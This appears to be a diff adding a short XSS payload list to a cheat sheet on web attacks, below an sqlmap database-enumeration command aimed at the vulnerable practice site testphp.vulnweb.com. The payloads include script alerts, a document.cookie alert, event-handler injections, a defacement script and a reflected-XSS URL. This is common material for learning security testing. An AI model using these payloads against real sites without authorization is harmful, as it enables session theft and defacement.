@@ -63,3 +63,19 @@ OR
 
 or
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" –dbs
+
+
+
+XSS - attack PAYLOADS
+
+<script>alert("You are Hacked")</script>
+<script>alert('XSS Test');</script>
+<script>alert(document.cookie);</script>
+<img src="invalid-image" onerror="alert('XSS Alert');">
+<a href="#" onclick="alert('XSS Click');"> Click me</a>
+<input type="text" value="XSS" onfocus="alert('XSS Focus')" autofocus>
+
+<script>document.body.innerHTML = "<h1>You've been
+hacked!</h1>";</script>
+
+https://testphp.vulnweb.com/search.php?query=<script>alert('URL XSS');</script>
